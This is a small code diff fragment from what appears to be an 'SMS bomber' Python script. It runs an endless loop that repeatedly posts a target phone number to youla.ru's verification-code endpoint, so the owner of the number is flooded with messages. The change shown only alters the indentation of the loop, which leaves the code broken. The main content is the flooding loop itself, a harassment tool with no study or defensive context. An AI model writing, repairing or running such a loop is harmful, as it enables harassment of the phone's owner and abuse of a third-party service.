@@ -28,7 +28,7 @@ numplus = '+' + num
 print(random.choice(colors))
 
 def infinity():
-	while True:
+while True:
 #1
     try:
         print(requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":numplus}))
